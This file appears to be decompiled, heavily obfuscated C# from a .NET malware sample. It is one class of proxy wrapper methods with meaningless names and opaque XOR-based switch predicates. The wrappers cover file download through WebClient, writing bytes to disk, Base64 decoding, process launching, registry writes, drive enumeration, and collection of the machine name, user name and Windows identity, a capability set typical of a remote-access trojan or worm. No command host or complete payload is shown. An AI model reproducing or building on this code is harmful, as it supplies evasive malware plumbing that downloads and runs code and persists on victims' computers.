using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class12
{
	internal sealed class Class13
	{
		internal static SettingsBase smethod_0<T>(T gparam_0, char char_0, short short_0) where T : SettingsBase
		{
			int num = 0;
			SettingsBase result = (SettingsBase)((((short_0 ^ char_0) - 93) ^ 0) switch
			{
				0 => Class14.Class15.smethod_0<SettingsBase>((SettingsBase)(object)gparam_0, 975, 'μ'), 
				_ => null, 
			});
			num++;
			return result;
		}

		internal static string[] smethod_1<T>(T gparam_0, short short_0, char char_0) where T : Assembly
		{
			int num = 0;
			string[] result = (((char_0 ^ short_0) - 103) ^ 0) switch
			{
				0 => gparam_0.GetManifestResourceNames(), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static string smethod_2(char char_0, int int_0)
		{
			int num = 0;
			string result;
			int num2;
			do
			{
				result = (((char_0 ^ int_0) - 14) ^ num) switch
				{
					4 => Path.GetTempPath(), 
					3 => Environment.MachineName, 
					2 => Environment.UserName, 
					1 => Interaction.Command(), 
					0 => Application.get_ExecutablePath(), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_3(int int_0, char char_0, short short_0)
		{
			int num = 0;
			int num2;
			do
			{
				switch (((char_0 ^ short_0) - 92) ^ num)
				{
				case 0:
					Class14.Class15.smethod_1(int_0, 314, 292);
					break;
				}
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static object smethod_4<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : ManagementBaseObject where U : string
		{
			int num = 0;
			object result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 104) ^ num) switch
				{
					0 => Class14.Class15.smethod_2<string, ManagementBaseObject>((ManagementBaseObject)(object)gparam_0, (string)gparam_1, 'Ǫ', (short)470), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static IPAddress smethod_5<T>(T gparam_0, int int_0, short short_0) where T : string
		{
			int num = 0;
			IPAddress result = (((int_0 ^ short_0) - 43) ^ 0) switch
			{
				0 => Class14.smethod_3((string)gparam_0, (short)960, (short)950), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static object smethod_6<T, U>(U gparam_0, T gparam_1, short short_0, char char_0) where T : string where U : AppDomain
		{
			int num = 0;
			object result;
			do
			{
				result = (((short_0 ^ char_0) - 127) ^ num) switch
				{
					0 => gparam_0.GetData(gparam_1), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static Assembly smethod_7<T>(T gparam_0, int int_0, short short_0) where T : Type
		{
			int num = 0;
			Assembly result = (((short_0 ^ int_0) - 73) ^ 0) switch
			{
				0 => (Assembly)(ICustomAttributeProvider)Class14.Class15.smethod_5((Type)gparam_0, (short)823, '\u0356'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_8<T>(T gparam_0, byte[] byte_0, char char_0, short short_0) where T : string
		{
			int num = 0;
			do
			{
				switch (((short_0 ^ char_0) - 59) ^ num)
				{
				case 0:
					File.WriteAllBytes(gparam_0, byte_0);
					break;
				}
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
		}

		internal static bool smethod_9<T>(T gparam_0, short short_0, short short_1) where T : WeakReference
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((short_1 ^ short_0) - 65) ^ num) switch
				{
					0 => gparam_0.IsAlive, 
					_ => false, 
				};
				num++;
				num2 = short_1 * short_1;
				num2 = short_1 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_10<T>(T gparam_0, int int_0, int int_1) where T : Component
		{
			int num = 0;
			switch (((int_1 ^ int_0) - 122) ^ 0)
			{
			case 0:
				Class14.Class16.smethod_4((Component)gparam_0, (short)967, 'Π');
				break;
			}
			num++;
		}

		internal static Delegate smethod_11<T, U>(U gparam_0, T gparam_1, char char_0, int int_0) where T : Delegate where U : Delegate
		{
			int num = 0;
			Delegate result = (((char_0 ^ int_0) - 104) ^ 0) switch
			{
				0 => Class14.Class16.Class17.smethod_0((Delegate)gparam_0, (Delegate)gparam_1, 'ȑ', (short)530), 
				1 => Class14.Class16.Class17.smethod_0((Delegate)gparam_0, (Delegate)gparam_1, 'ů', (short)363), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_12<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, char char_0, int int_2) where T : Stream
		{
			int num = 0;
			int num2;
			do
			{
				switch (((int_2 ^ char_0) - 58) ^ num)
				{
				case 0:
					Class14.Class16.smethod_6((Stream)gparam_0, byte_0, int_0, int_1, (short)711, 748);
					break;
				}
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static string[] smethod_13<T, U>(T gparam_0, U gparam_1, short short_0, char char_0) where T : string where U : string
		{
			int num = 0;
			string[] result = (((short_0 ^ char_0) - 6) ^ 0) switch
			{
				0 => Directory.GetFiles(gparam_0, gparam_1), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_14<T>(T gparam_0, int int_0, char char_0) where T : Thread
		{
			int num = 0;
			switch (((char_0 ^ int_0) - 87) ^ 0)
			{
			case 0:
				gparam_0.Start();
				break;
			}
			num++;
		}

		internal static int smethod_15<T>(T gparam_0, int int_0, short short_0, short short_1) where T : Array
		{
			int num = 0;
			int result = (((short_1 ^ short_0) - 59) ^ 0) switch
			{
				0 => Class14.Class15.smethod_10((Array)gparam_0, int_0, 876, (short)880), 
				_ => 7, 
			};
			num++;
			return result;
		}

		internal static int smethod_16<T, U>(U gparam_0, T gparam_1, CompareMethod compareMethod_0, short short_0, char char_0) where T : string where U : string
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			int result;
			int num2;
			do
			{
				result = (((short_0 ^ char_0) - 111) ^ num) switch
				{
					0 => Strings.InStr((string)gparam_0, (string)gparam_1, compareMethod_0), 
					_ => 4, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_17<T, U, V>(U gparam_0, T gparam_1, V gparam_2, char char_0, char char_1) where T : string where U : WebClient where V : string
		{
			int num = 0;
			int num2;
			do
			{
				switch (((char_0 ^ char_1) - 100) ^ num)
				{
				case 0:
					Class14.Class16.smethod_9((WebClient)gparam_0, (string)gparam_1, (string)gparam_2, 'ô', (short)224);
					break;
				}
				num++;
				num2 = char_1 * char_1;
				num2 = char_1 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static DriveType smethod_18<T>(T gparam_0, int int_0, int int_1) where T : DriveInfo
		{
			int num = 0;
			DriveType result = (((int_0 ^ int_1) - 42) ^ 0) switch
			{
				0 => Class14.Class15.smethod_11((DriveInfo)gparam_0, 'Ƥ', 485), 
				_ => DriveType.Unknown, 
			};
			num++;
			return result;
		}

		internal static void smethod_19<T>(T gparam_0, bool bool_0, char char_0, short short_0) where T : ProcessStartInfo
		{
			int num = 0;
			do
			{
				switch (((short_0 ^ char_0) - 79) ^ num)
				{
				case 0:
					gparam_0.UseShellExecute = bool_0;
					break;
				}
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
		}
	}

	internal static object smethod_0<T>(T gparam_0, object[] object_0, string[] string_0, char char_0, char char_1)
	{
		int num = 0;
		object result = (((char_1 ^ char_0) - 41) ^ 0) switch
		{
			0 => Class14.Class16.Class17.smethod_4((object)gparam_0, object_0, string_0, (short)400, 'Ƙ'), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static double smethod_1<T>(T gparam_0, short short_0, short short_1) where T : string
	{
		int num = 0;
		double result = (((short_0 ^ short_1) - 117) ^ 0) switch
		{
			0 => Conversions.ToDouble((string)gparam_0), 
			_ => 0.4173267661147971, 
		};
		num++;
		return result;
	}

	internal static int smethod_2<T, U>(T gparam_0, U gparam_1, bool bool_0, int int_0, char char_0) where T : string where U : string
	{
		int num = 0;
		int result;
		do
		{
			result = (((int_0 ^ char_0) - 1) ^ num) switch
			{
				0 => Class14.Class15.smethod_15((string)gparam_0, (string)gparam_1, bool_0, (short)574, (short)567), 
				_ => 8, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static void smethod_3<T>(T gparam_0, char char_0, short short_0) where T : Stream
	{
		int num = 0;
		do
		{
			switch (((char_0 ^ short_0) - 100) ^ num)
			{
			case 0:
				gparam_0.Dispose();
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}

	internal static string smethod_4<T>(T gparam_0, char char_0, short short_0) where T : OperatingSystem
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((short_0 ^ char_0) - 32) ^ num) switch
			{
				0 => Class14.smethod_6((OperatingSystem)gparam_0, 'ř', 'Ū'), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_5<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, int int_2, short short_0) where T : MemoryStream
	{
		int num = 0;
		switch (((int_2 ^ short_0) - 44) ^ 0)
		{
		case 0:
			Class14.Class15.smethod_16((MemoryStream)gparam_0, byte_0, int_0, int_1, (short)377, 'Ŝ');
			break;
		}
		num++;
	}

	internal static string smethod_6<T>(T gparam_0, int int_0, char char_0) where T : ComputerInfo
	{
		int num = 0;
		string result;
		do
		{
			result = (((int_0 ^ char_0) - 122) ^ num) switch
			{
				1 => (string)(IComparable<string>)Class14.Class16.Class17.smethod_5<ComputerInfo>((ComputerInfo)(object)gparam_0, (short)450, (short)477), 
				0 => (string)(IComparable<string>)Class14.Class16.Class17.smethod_5<ComputerInfo>((ComputerInfo)(object)gparam_0, (short)610, (short)636), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static byte[] smethod_7<T>(T gparam_0, int int_0, char char_0) where T : string
	{
		int num = 0;
		byte[] result;
		int num2;
		do
		{
			result = (((int_0 ^ char_0) - 27) ^ num) switch
			{
				0 => (byte[])(IEnumerable)Convert.FromBase64String(gparam_0), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static string smethod_8<T>(T gparam_0, char char_0, short short_0) where T : DriveInfo
	{
		int num = 0;
		string result;
		do
		{
			result = (((char_0 ^ short_0) - 95) ^ num) switch
			{
				0 => Class14.Class15.smethod_17((DriveInfo)gparam_0, 'ɹ', (short)587), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static Process smethod_9<T>(T gparam_0, char char_0, int int_0) where T : string
	{
		int num = 0;
		Process result = (((char_0 ^ int_0) - 82) ^ 0) switch
		{
			0 => Process.Start(gparam_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_10<T>(T gparam_0, short short_0, int int_0)
	{
		int num = 0;
		string result = (((short_0 ^ int_0) - 97) ^ 0) switch
		{
			0 => (string)(IComparable)Class14.smethod_10((object)gparam_0, 'ΐ', (short)897), 
			1 => (string)(IComparable)Class14.smethod_10((object)gparam_0, 'À', (short)210), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_11<T>(T gparam_0, int int_0, short short_0) where T : StringBuilder
	{
		int num = 0;
		string result = (((short_0 ^ int_0) - 62) ^ 0) switch
		{
			0 => gparam_0.ToString(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_12(Environment.SpecialFolder specialFolder_0, char char_0, short short_0)
	{
		int num = 0;
		string result = (((short_0 ^ char_0) - 32) ^ 0) switch
		{
			0 => (string)(ICloneable)Class14.Class16.smethod_13(specialFolder_0, 316, 'š'), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_13<T, U, V>(V gparam_0, U gparam_1, T gparam_2, int int_0, char char_0) where U : string where V : RegistryKey
	{
		int num = 0;
		do
		{
			switch (((int_0 ^ char_0) - 114) ^ num)
			{
			case 0:
				Class14.Class16.Class17.smethod_6((RegistryKey)gparam_0, (string)gparam_1, (object)gparam_2, 'ω', (short)984);
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}

	internal static void smethod_14<T, U>(U gparam_0, T gparam_1, short short_0, char char_0) where T : string where U : string
	{
		int num = 0;
		switch (((short_0 ^ char_0) - 29) ^ 0)
		{
		case 0:
			Class14.Class16.smethod_14((string)gparam_0, (string)gparam_1, (short)742, (short)695);
			break;
		}
		num++;
	}

	internal static ComputerInfo smethod_15<T>(T gparam_0, int int_0, char char_0) where T : ServerComputer
	{
		int num = 0;
		ComputerInfo result = (ComputerInfo)((((char_0 ^ int_0) - 113) ^ 0) switch
		{
			0 => Class14.Class16.Class17.smethod_8<ServerComputer>((ServerComputer)(object)gparam_0, 'θ', (short)1023), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static WindowsIdentity smethod_16(short short_0, int int_0)
	{
		int num = 0;
		WindowsIdentity result = (((int_0 ^ short_0) - 5) ^ 0) switch
		{
			0 => Class14.Class16.Class17.smethod_10('\u033a', 803), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static int smethod_17<T>(T gparam_0, int int_0, int int_1, int int_2, char char_0) where T : Random
	{
		int num = 0;
		int result = (((char_0 ^ int_2) - 52) ^ 0) switch
		{
			0 => Class14.Class15.smethod_20((Random)gparam_0, int_0, int_1, 1015, 'ύ'), 
			_ => int_1, 
		};
		num++;
		return result;
	}

	internal static FileSystemProxy smethod_18<T>(T gparam_0, int int_0, char char_0) where T : ServerComputer
	{
		int num = 0;
		FileSystemProxy result;
		do
		{
			result = (FileSystemProxy)((((char_0 ^ int_0) - 86) ^ num) switch
			{
				0 => Class14.Class16.smethod_15<ServerComputer>((ServerComputer)(object)gparam_0, (short)384, 489), 
				_ => null, 
			});
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static string smethod_19<T>(T gparam_0, byte[] byte_0, short short_0, char char_0) where T : Encoding
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((char_0 ^ short_0) - 118) ^ num) switch
			{
				0 => (string)(IConvertible)Class14.Class15.smethod_21((Encoding)gparam_0, byte_0, (short)738, '\u02de'), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static bool smethod_20<T>(T gparam_0, char char_0, int int_0) where T : DriveInfo
	{
		int num = 0;
		bool result = (((char_0 ^ int_0) - 117) ^ 0) switch
		{
			0 => gparam_0.IsReady, 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static object smethod_21<T, U>(U gparam_0, T gparam_1, short short_0, int int_0) where T : Type
	{
		int num = 0;
		object result;
		int num2;
		do
		{
			result = (((short_0 ^ int_0) - 85) ^ num) switch
			{
				0 => Class14.smethod_13((object)gparam_0, (Type)gparam_1, (short)191, 137), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_22<T, U>(U gparam_0, T gparam_1, char char_0, char char_1) where T : string where U : ProcessStartInfo
	{
		int num = 0;
		switch (((char_0 ^ char_1) - 111) ^ 0)
		{
		case 0:
			Class14.Class16.smethod_17((ProcessStartInfo)gparam_0, (string)gparam_1, 385, 392);
			break;
		case 1:
			Class14.Class16.smethod_17((ProcessStartInfo)gparam_0, (string)gparam_1, 870, 876);
			break;
		}
		num++;
	}

	internal static MsgBoxResult smethod_23<T, U>(T gparam_0, MsgBoxStyle msgBoxStyle_0, U gparam_1, short short_0, int int_0)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		MsgBoxResult result = (MsgBoxResult)((((int_0 ^ short_0) - 11) ^ 0) switch
		{
			0 => Class14.smethod_14((object)gparam_0, msgBoxStyle_0, (object)gparam_1, '(', (short)47), 
			_ => 0, 
		});
		num++;
		return result;
	}
}
